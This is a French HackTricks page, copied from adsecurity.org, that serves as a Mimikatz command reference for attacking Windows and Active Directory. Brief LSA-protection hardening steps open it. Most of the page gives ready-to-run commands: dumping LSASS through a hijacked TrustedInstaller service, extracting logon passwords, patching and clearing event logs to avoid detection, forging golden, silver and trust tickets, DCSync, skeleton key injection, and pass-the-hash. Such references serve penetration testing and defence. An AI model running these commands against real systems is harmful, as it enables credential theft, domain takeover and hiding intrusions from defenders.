# Mimikatz

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Le contenu de cette page a été copié depuis [adsecurity.org](https://adsecurity.org/?page\_id=1821)

## LM et Clear-Text en mémoire

À partir de Windows 8.1 et de Windows Server 2012 R2, le hachage LM et le mot de passe "en clair" ne sont plus en mémoire.

Afin d'empêcher le mot de passe "en clair" d'être placé dans LSASS, la clé de registre suivante doit être définie sur "0" (Digest Disabled) :

_HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential" (DWORD)_

## **Mimikatz & LSA Protection:**

Windows Server 2012 R2 et Windows 8.1 incluent une nouvelle fonctionnalité appelée LSA Protection qui consiste à activer [LSASS en tant que processus protégé sur Windows Server 2012 R2](https://technet.microsoft.com/en-us/library/dn408187.aspx) (Mimikatz peut contourner cela avec un pilote, mais cela devrait faire du bruit dans les journaux d'événements) :

_LSA, qui inclut le processus Local Security Authority Server Service (LSASS), valide les utilisateurs pour les connexions locales et à distance et applique les stratégies de sécurité locales. Le système d'exploitation Windows 8.1 fournit une protection supplémentaire pour LSA afin d'empêcher la lecture de la mémoire et l'injection de code par des processus non protégés. Cela offre une sécurité supplémentaire pour les informations d'identification que LSA stocke et gère._

Activation de la protection LSA :

1. Ouvrez l'éditeur de registre (RegEdit.exe) et accédez à la clé de registre située à : HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa et définissez la valeur de la clé de registre sur : "RunAsPPL"=dword:00000001.
2. Créez un nouveau GPO et accédez à Configuration de l'ordinateur, Préférences, Paramètres Windows. Cliquez avec le bouton droit sur Registre, pointez sur Nouveau, puis cliquez sur Élément de Registre. La boîte de dialogue Nouvelles propriétés de Registre apparaît. Dans la liste Hive, cliquez sur HKEY\_LOCAL\_MACHINE. Dans la liste Chemin de la clé, parcourez SYSTEM\CurrentControlSet\Control\Lsa. Dans la zone Nom de la valeur, tapez RunAsPPL. Dans la zone Type de valeur, cliquez sur REG\_DWORD. Dans la zone Données de la valeur, tapez 00000001. Cliquez sur OK.

LSA Protection empêche les processus non protégés d'interagir avec LSASS. Mimikatz peut toujours contourner cela avec un pilote ("!+").

[![Mimikatz-Driver-Remove-LSASS-Protection](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection.jpg)

### Contournement de SeDebugPrivilege désactivé
Par défaut, SeDebugPrivilege est accordé au groupe Administrateurs via la stratégie de sécurité locale. Dans un environnement Active Directory, [il est possible de supprimer ce privilège](https://medium.com/blue-team/preventing-mimikatz-attacks-ed283e7ebdd5) en définissant Configuration de l'ordinateur --> Stratégies --> Paramètres Windows --> Paramètres de sécurité --> Droits d'utilisateur --> Programmes de débogage définis comme un groupe vide. Même sur des appareils connectés à AD hors ligne, ce paramètre ne peut pas être écrasé et les administrateurs locaux recevront une erreur lorsqu'ils essaieront de vider la mémoire ou d'utiliser Mimikatz.

Cependant, le compte TrustedInstaller aura toujours accès pour vider la mémoire et [peut être utilisé pour contourner cette défense](https://www.pepperclipp.com/other-articles/dump-lsass-when-debug-privilege-is-disabled). En modifiant la configuration du service TrustedInstaller, le compte peut être exécuté pour utiliser ProcDump et vider la mémoire pour `lsass.exe`.
```
sc config TrustedInstaller binPath= "C:\Users\Public\procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp"
sc start TrustedInstaller
```
[![TrustedInstaller-Dump-Lsass](https://1860093151-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-M6yZUYP7DLMbZuztKpV%2Fuploads%2FJtprjloNPADNSpb6S0DS%2Fimage.png?alt=media&token=9b639459-bd4c-4897-90af-8990125fa058)

Ce fichier de vidage peut être exfiltré vers un ordinateur contrôlé par un attaquant où les informations d'identification peuvent être extraites.
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Principal

### **ÉVÉNEMENT**

**ÉVÉNEMENT::Effacer** – Effacer un journal d'événements\
[\
![Mimikatz-Event-Clear](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear.png)

**ÉVÉNEMENT:::Drop** – (_**expérimental**_) Patch du service Événements pour éviter les nouveaux événements

[![Mimikatz-Event-Drop](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Drop.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Drop.png)

Note:\
Exécutez privilege::debug puis event::drop pour patcher le journal d'événements. Ensuite, exécutez Event::Clear pour effacer le journal d'événements sans qu'un événement de journal effacé (1102) soit enregistré.

### KERBEROS

#### Ticket d'or

Un ticket d'or est un TGT utilisant le hachage de mot de passe NTLM de KRBTGT pour chiffrer et signer.

Un ticket d'or (GT) peut être créé pour se faire passer pour n'importe quel utilisateur (réel ou imaginaire) dans le domaine en tant que membre de n'importe quel groupe dans le domaine (fournissant une quantité virtuellement illimitée de droits) pour toutes les ressources du domaine.

**Référence de commande Mimikatz Golden Ticket:**

La commande Mimikatz pour créer un ticket d'or est "kerberos::golden"

* /domain – le nom de domaine complet. Dans cet exemple : "lab.adsecurity.org".
* /sid – l'ID de sécurité (SID) du domaine. Dans cet exemple : "S-1-5-21-1473643419-774954089-2222329127".
* /sids – SIDs supplémentaires pour les comptes/groupes dans la forêt AD avec les droits que vous voulez que le ticket usurpe. En général, il s'agira du groupe Enterprise Admins pour le domaine racine "S-1-5-21-1473643419-774954089-5872329127-519". Ce paramètre ajoute les SIDs fournis au paramètre Historique SID.](https://adsecurity.org/?p=1640)
* /user – nom d'utilisateur à usurper
* /groups (facultatif) – RID de groupe dont l'utilisateur est membre (le premier est le groupe principal).\
  Ajoutez les RID de compte utilisateur ou d'ordinateur pour recevoir le même accès.\
  Groupes par défaut : 513,512,520,518,519 pour les groupes d'administrateurs bien connus (énumérés ci-dessous).
* /krbtgt – hachage de mot de passe NTLM pour le compte de service KDC de domaine (KRBTGT). Utilisé pour chiffrer et signer le TGT.
* /ticket (facultatif) – fournir un chemin et un nom pour enregistrer le fichier Golden Ticket pour une utilisation ultérieure ou utiliser /ptt pour injecter immédiatement le ticket d'or en mémoire pour une utilisation.
* /ptt – en alternative à /ticket – utilisez ceci pour injecter immédiatement le ticket forgé en mémoire pour une utilisation.
* /id (facultatif) – RID utilisateur. La valeur par défaut de Mimikatz est 500 (RID du compte Administrateur par défaut).
* /startoffset (facultatif) – le décalage de début lorsque le ticket est disponible (généralement réglé sur -10 ou 0 si cette option est utilisée). La valeur par défaut de Mimikatz est 0.
* /endin (facultatif) – durée de vie du ticket. La valeur par défaut de Mimikatz est de 10 ans (\~5 262 480 minutes). Le paramètre de stratégie Kerberos par défaut d'Active Directory est de 10 heures (600 minutes).
* /renewmax (facultatif) – durée de vie maximale du ticket avec renouvellement. La valeur par défaut de Mimikatz est de 10 ans (\~5 262 480 minutes). Le paramètre de stratégie Kerberos par défaut d'Active Directory est de 7 jours (10 080 minutes).
* /sids (facultatif) – défini comme l'ID de sécurité (SID) du groupe Enterprise Admins dans la forêt AD (\[ADRootDomainSID]-519) pour usurper les droits d'administrateur d'entreprise dans toute la forêt AD (administrateur AD dans chaque domaine de la forêt AD).
* /aes128 – la clé AES128
* /aes256 – la clé AES256

Groupes par défaut du ticket d'or :

* SID des utilisateurs du domaine : S-1-5-21\<DOMAINID>-513
* SID des administrateurs du domaine : S-1-5-21\<DOMAINID>-512
* SID des administrateurs de schéma : S-1-5-21\<DOMAINID>-518
* SID des administrateurs d'entreprise : S-1-5-21\<DOMAINID>-519 (ceci n'est efficace que lorsque le ticket forgé est créé dans le domaine racine de la forêt, bien que l'ajout soit possible en utilisant le paramètre /sids pour les droits d'administrateur de la forêt AD)
* SID des propriétaires de créateurs de stratégie de groupe : S-1-5-21\<DOMAINID>-520
```
.\mimikatz "kerberos::golden /User:Administrator /domain:rd.lab.adsecurity.org /id:512 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit
```
[Golden tickets à travers les domaines](https://adsecurity.org/?p=1640)

#### Ticket d'argent

Un ticket d'argent est un TGS (similaire au format TGT) utilisant le hachage de mot de passe NTLM du compte de service cible (identifié par la cartographie SPN) pour le cryptage et la signature.

**Exemple de commande Mimikatz pour créer un ticket d'argent:**

La commande Mimikatz suivante crée un ticket d'argent pour le service CIFS sur le serveur adsmswin2k8r2.lab.adsecurity.org. Pour que ce ticket d'argent soit créé avec succès, le hachage de mot de passe du compte d'ordinateur AD pour adsmswin2k8r2.lab.adsecurity.org doit être découvert, soit à partir d'un vidage de domaine AD, soit en exécutant Mimikatz sur le système local comme indiqué ci-dessus (_Mimikatz "privilege :: debug" "sekurlsa :: logonpasswords" exit_). Le hachage de mot de passe NTLM est utilisé avec le paramètre /rc4. Le type de SPN de service doit également être identifié dans le paramètre /service. Enfin, le nom de domaine complet de l'ordinateur cible doit être fourni dans le paramètre /target. N'oubliez pas l'ID de sécurité du domaine dans le paramètre /sid.
```
mimikatz “kerberos::golden /admin:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt” exit
```
#### [**Billet de confiance**](https://adsecurity.org/?p=1588)

Une fois que le hachage du mot de passe de confiance Active Directory est déterminé, un billet de confiance peut être généré. Les billets de confiance sont créés en utilisant le mot de passe partagé entre 2 domaines qui se font confiance.\
[Plus d'informations sur les billets de confiance.](https://adsecurity.org/?p=1588)

**Extraction des mots de passe de confiance (clés de confiance)**
```
Mimikatz “privilege::debug” “lsadump::trust /patch” exit
```
**Créer un ticket de confiance falsifié (TGT inter-domaines) en utilisant Mimikatz**

Forgez le ticket de confiance qui indique que le détenteur du ticket est un administrateur d'entreprise dans la forêt AD (en exploitant SIDHistory, "sids", à travers les confiances dans Mimikatz, ma "contribution" à Mimikatz). Cela permet un accès administratif complet d'un domaine enfant au domaine parent. Notez que ce compte n'a pas besoin d'exister nulle part car il s'agit effectivement d'un Golden Ticket à travers la confiance.
```
Mimikatz “Kerberos::golden /domain:child.lab.adsecurity.org /sid:S-1-5-21-3677078698-724690114-1972670770 /sids:S-1-5-21-1581655573-3923512380-696647894-519 /rc4:49ed1653275f78846ff06de1a02386fd /user:DarthVader /service:krbtgt /target:lab.adsecurity.org /ticket:c:\temp\tickets\EA-ADSECLABCHILD.kirbi” exit
```
Paramètres requis spécifiques pour les Trust Tickets :

* \*\*/\*\*target – le nom de domaine cible en FQDN.
* \*\*/\*\*service – le service Kerberos en cours d'exécution dans le domaine cible (krbtgt).
* \*\*/\*\*rc4 – le hachage NTLM pour le compte de service du service Kerberos (krbtgt).
* \*\*/\*\*ticket – fournir un chemin et un nom pour enregistrer le fichier de ticket forgé pour une utilisation ultérieure ou utiliser /ptt pour injecter immédiatement le golden ticket en mémoire pour une utilisation ultérieure.

#### **Plus de KERBEROS**

**KERBEROS::List** – Liste tous les tickets utilisateur (TGT et TGS) en mémoire utilisateur. Aucun privilège spécial n'est requis car il affiche uniquement les tickets de l'utilisateur actuel.\
Fonctionnalité similaire à "klist".

**KERBEROS::PTC** – Pass the cache (NT6)\
Les systèmes *Nix tels que Mac OS, Linux, BSD, Unix, etc. mettent en cache les informations d'identification Kerberos. Ces données mises en cache peuvent être copiées et transmises à l'aide de Mimikatz. Également utile pour injecter des tickets Kerberos dans des fichiers ccache.

Un bon exemple de kerberos::ptc de Mimikatz est lors de l'exploitation de MS14-068 avec PyKEK. PyKEK génère un fichier ccache qui peut être injecté avec Mimikatz en utilisant kerberos::ptc.

[![Mimikatz-PTC-PyKEK-ccacheFile](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-PTC-PyKEK-ccacheFile.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-PTC-PyKEK-ccacheFile.jpg)

**KERBEROS::PTT** – Pass the ticket\
Après avoir trouvé un ticket Kerberos, il peut être copié sur un autre système et transmis à la session en cours, simulant ainsi une connexion sans aucune communication avec le contrôleur de domaine. Aucun droit spécial requis.\
Similaire à SEKURLSA::PTH (Pass-The-Hash).

* /filename – le nom de fichier du ticket (peut être multiple)
* /diretory – un chemin de répertoire, tous les fichiers .kirbi à l'intérieur seront injectés.

[![KerberosUnConstrainedDelegation-Mimikatz-PTT-LS-Ticket2](https://adsecurity.org/wp-content/uploads/2015/09/KerberosUnConstrainedDelegation-Mimikatz-PTT-LS-Ticket2.png)](https://adsecurity.org/wp-content/uploads/2015/09/KerberosUnConstrainedDelegation-Mimikatz-PTT-LS-Ticket2.png)

**KERBEROS::Purge** – Purge tous les tickets Kerberos\
Fonctionnalité similaire à "klist purge". Exécutez cette commande avant de transmettre des tickets (PTC, PTT, etc.) pour vous assurer que le contexte utilisateur correct est utilisé.

[![Mimikatz-Kerberos-Purge](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Purge.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Purge.png)

**KERBEROS::TGT** – Obtenir le TGT actuel pour l'utilisateur actuel.

[![Mimikatz-Kerberos-TGT](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-TGT.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-TGT.png)

### LSADUMP

**LSADUMP**::**DCShadow** – Définir les machines actuelles en tant que DC pour avoir la capacité de créer de nouveaux objets à l'intérieur du DC (méthode persistante).\
Cela nécessite des droits d'administration AD complets ou le hachage de mot de passe KRBTGT.\
DCShadow définit temporairement l'ordinateur comme "DC" aux fins de la réplication :

* Crée 2 objets dans la partition Configuration de la forêt AD.
* Met à jour le SPN de l'ordinateur utilisé pour inclure "GC" (Global Catalog) et "E3514235-4B06-11D1-AB04-00C04FC2DCD2" (Réplication AD). Plus d'informations sur les noms principaux de service Kerberos dans la section [ADSecurity SPN](https://adsecurity.org/?page\_id=183).
* Pousse les mises à jour vers les DC via DrsReplicaAdd et KCC.
* Supprime les objets créés de la partition Configuration.

**LSADUMP::DCSync** – Demander à un DC de synchroniser un objet (obtenir les données de mot de passe pour le compte)\
[Nécessite l'appartenance à Administrateur de domaine, Administrateurs de domaine ou une délégation personnalisée.](https://adsecurity.org/?p=1729)

Une fonctionnalité majeure ajoutée à Mimkatz en août 2015 est "DCSync" qui "imite" efficacement un contrôleur de domaine et demande des données de mot de passe de compte à partir du contrôleur de domaine ciblé.

**Options DCSync :**

* /all – DCSync extrait les données pour l'ensemble du domaine.
* /user – ID utilisateur ou SID de l'utilisateur dont vous souhaitez extraire les données.
* /domain (facultatif) – FQDN du domaine Active Directory. Mimikatz découvrira un DC dans le domaine auquel se connecter. Si ce paramètre n'est pas fourni, Mimikatz utilise par défaut le domaine actuel.
* /csv – exportation au format csv
* /dc (facultatif) – Spécifiez le contrôleur de domaine auquel DCSync doit se connecter et collecter des données.

Il y a également un paramètre /guid.

**Exemples de commandes DCSync :**

Extraire les données de mot de passe pour le compte utilisateur KRBTGT dans le domaine rd.adsecurity.org :\
_Mimikatz "lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt" exit_

Extraire les données de mot de passe pour le compte utilisateur Administrateur dans le domaine rd.adsecurity.org :\
_Mimikatz "lsadump::dcsync /domain:rd.adsecurity.org /user:Administrator" exit_

Extraire les données de mot de passe pour le compte d'ordinateur ADSDC03 Domain Controller dans le domaine lab.adsecurity.org :\
_Mimikatz "lsadump::dcsync /domain:lab.adsecurity.org /user:adsdc03$" exit_

**LSADUMP::LSA** – Demander au serveur LSA de récupérer SAM/AD entreprise (normal, patch sur le fil ou injecter). Utilisez /patch pour un sous-ensemble de données, utilisez /inject pour tout. _Nécessite des droits Système ou de débogage._

* /inject – Injecter LSASS pour extraire les informations d'identification
* /name – nom de compte pour le compte utilisateur cible
* /id – RID pour le compte utilisateur cible
* /patch – patch LSASS.

Souvent, les comptes de service sont membres de Domain Admins (ou équivalent) ou un administrateur de domaine s'est récemment connecté à l'ordinateur à partir duquel un attaquant peut extraire des informations d'identification. En utilisant ces informations d'identification, un attaquant peut accéder à un contrôleur de domaine et obtenir toutes les informations d'identification de domaine, y compris le hachage NTLM du compte KRBTGT qui est utilisé pour créer des Golden Tickets Kerberos.
```
mimikatz lsadump::lsa /inject exit
```
**LSADUMP::NetSync**

NetSync offre un moyen simple d'utiliser les données de mot de passe du compte d'ordinateur DC pour se faire passer pour un contrôleur de domaine via un Silver Ticket et de synchroniser les informations du compte cible, y compris les données de mot de passe.

**LSADUMP::SAM** - obtenir le SysKey pour décrypter les entrées SAM (à partir du registre ou de la ruche). L'option SAM se connecte à la base de données locale du gestionnaire de compte de sécurité (SAM) et extrait les informations d'identification des comptes locaux.

**LSADUMP::Secrets** - obtenir le SysKey pour décrypter les entrées SECRETS (à partir du registre ou des ruches).

**LSADUMP::SetNTLM** - Demander à un serveur de définir un nouveau mot de passe/ntlm pour un utilisateur.

[**LSADUMP::Trust**](https://adsecurity.org/?p=1588) - Demander au serveur LSA de récupérer les informations d'authentification de confiance (normale ou correctif en vol).

### MISC

[**MISC::Skeleton**](https://adsecurity.org/?p=1275) - Injecter une clé Skeleton dans le processus LSASS sur le contrôleur de domaine.
```
"privilege::debug" "misc::skeleton"
```
### PRIVILEGE

**PRIVILEGE::Backup** – obtenir le privilège/droit de sauvegarde. Nécessite des droits de débogage.

**PRIVILEGE::Debug** – obtenir des droits de débogage (ceci ou les droits de système local sont requis pour de nombreuses commandes Mimikatz).

### SEKURLSA

**SEKURLSA::Credman** – Liste le gestionnaire de mots de passe

**SEKURLSA::Ekeys** – Liste les clés de chiffrement Kerberos

**SEKURLSA::Kerberos** – Liste les informations d'identification Kerberos pour tous les utilisateurs authentifiés (y compris les services et le compte d'ordinateur)

**SEKURLSA::Krbtgt** – obtenir les données de mot de passe du compte de service Kerberos de domaine (KRBTGT)

**SEKURLSA::SSP** – Liste les informations d'identification SSP

**SEKURLSA::Wdigest** – Liste les informations d'identification WDigest

**SEKURLSA::LogonPasswords** – liste toutes les informations d'identification de fournisseur disponibles. Cela montre généralement les informations d'identification d'utilisateur et d'ordinateur récemment connectés.

* Dump les données de mot de passe dans LSASS pour les comptes actuellement connectés (ou récemment connectés) ainsi que pour les services s'exécutant sous le contexte des informations d'identification utilisateur.
* Les mots de passe de compte sont stockés en mémoire de manière réversible. S'ils sont en mémoire (avant Windows 8.1/Windows Server 2012 R2, ils l'étaient), ils sont affichés. Windows 8.1/Windows Server 2012 R2 ne stocke pas le mot de passe du compte de cette manière dans la plupart des cas. KB2871997 "rétroporte" cette capacité de sécurité vers Windows 7, Windows 8, Windows Server 2008R2 et Windows Server 2012, bien que l'ordinateur nécessite une configuration supplémentaire après l'application de KB2871997.
* Nécessite un accès administrateur (avec des droits de débogage) ou des droits de système local.

**SEKURLSA::Minidump** – basculer vers le contexte de processus de minidump LSASS (lire le dump lsass)

**SEKURLSA::Pth** – Pass-the-Hash et Over-Pass-the-Hash (alias pass the key).

_Mimikatz peut effectuer l'opération bien connue "Pass-The-Hash" pour exécuter un processus sous d'autres informations d'identification avec le hachage NTLM du mot de passe de l'utilisateur, au lieu de son vrai mot de passe. Pour cela, il démarre un processus avec une fausse identité, puis remplace les fausses informations (hachage NTLM du faux mot de passe) par les vraies informations (hachage NTLM du vrai mot de passe)._

* /user – le nom d'utilisateur que vous voulez usurper, gardez à l'esprit que Administrator n'est pas le seul nom pour ce compte bien connu.
* /domain – le nom de domaine complet - sans domaine ou en cas d'utilisateur/administrateur local, utilisez le nom de l'ordinateur ou du serveur, le groupe de travail ou autre.
* /rc4 ou /ntlm – facultatif – la clé RC4 / hachage NTLM du mot de passe de l'utilisateur.
* /run – facultatif – la ligne de commande à exécuter – par défaut : cmd pour avoir un shell.

[![Mimikatz-Sekurlsa-PTH](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH.jpg)

**SEKURLSA::Tickets** – Liste tous les tickets Kerberos disponibles pour tous les utilisateurs récemment authentifiés, y compris les services s'exécutant sous le contexte d'un compte utilisateur et le compte d'ordinateur AD local.\
Contrairement à kerberos::list, sekurlsa utilise la lecture en mémoire et n'est pas soumis aux restrictions d'exportation de clé. sekurlsa peut accéder aux tickets d'autres sessions (utilisateurs).

* /export – facultatif – les tickets sont exportés dans des fichiers .kirbi. Ils commencent par le LUID de l'utilisateur et le numéro de groupe (0 = TGS, 1 = ticket client(?) et 2 = TGT)

Tout comme le vol de mots de passe à partir de LSASS, en utilisant le module sekurlsa, un attaquant peut obtenir toutes les données de ticket Kerberos en mémoire sur un système, y compris celles appartenant à un administrateur ou à un service.\
Ceci est extrêmement utile si un attaquant a compromis un serveur Web configuré pour la délégation Kerberos que les utilisateurs accèdent avec un serveur SQL en arrière-plan. Cela permet à un attaquant de capturer et de réutiliser tous les tickets d'utilisateur en mémoire sur ce serveur.

La commande "kerberos::tickets" de mimikatz affiche les tickets Kerberos de l'utilisateur connecté actuellement et ne nécessite pas de droits élevés. En exploitant la capacité du module sekurlsa à lire depuis la mémoire protégée (LSASS), tous les tickets Kerberos sur le système peuvent être extraits.

Commande : _mimikatz sekurlsa::tickets exit_

* Dump tous les tickets Kerberos authentifiés sur un système.
* Nécessite un accès administrateur (avec débogage) ou des droits de système local.

### **SID**

Le module SID de Mimikatz remplace MISC::AddSID. Utilisez SID::Patch pour patcher le service ntds.

**SID::add** – Ajouter un SID à l'historique des SID d'un objet

[![Mimikatz-SID-add](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-add.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-add.png)

**SID::modify** – Modifier l'objet SID d'un objet

[![Mimikatz-SID-Modify](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Modify.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Modify.png)

### **TOKEN**

Le module Token de Mimikatz permet à Mimikatz d'interagir avec les jetons d'authentification Windows, y compris la récupération et l'usurpation de jetons existants.

**TOKEN::Elevate** – usurper un jeton. Utilisé pour élever les autorisations à SYSTEM (par défaut) ou trouver un jeton d'administrateur de domaine sur la machine en utilisant l'API Windows.\
_Requiert des droits d'administrateur._

[![Mimikatz-Token-Elevate1](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1-1.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1-1.png)

Trouver une information d'identification d'administrateur de domaine sur la machine et utiliser ce jeton : _token::elevate /domainadmin_

[![Mimikatz-Token-Elevate-DomainAdmin](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin.jpg)

**TOKEN::List** – liste tous les jetons du système

### **TS**

**TS::MultiRDP** – (expérimental) Patch du service Terminal Server pour permettre à plusieurs utilisateurs de se connecter

[![Mimikatz-TS-MultiRDP](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-TS-MultiRDP.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-TS-MultiRDP.png)

**TS::Sessions** – Liste des sessions TS/RDP.
